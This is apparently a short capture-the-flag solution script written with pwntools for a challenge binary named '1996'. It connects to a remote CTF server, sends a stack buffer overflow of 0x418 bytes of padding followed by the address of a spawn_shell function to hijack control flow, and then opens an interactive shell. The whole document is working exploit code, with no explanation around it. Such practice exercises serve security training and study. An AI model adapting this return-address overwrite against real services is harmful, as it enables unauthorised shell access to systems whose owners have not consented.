#!/usr/bin/python 
from pwn import *

#p = process("./1996")
p = remote("ctf.j0n9hyun.xyz", 3013)
elf = ELF("./1996")
spawn_shell = 0x400897

p.sendline('A'*(0x410+0x8) + p64(spawn_shell))

p.interactive()
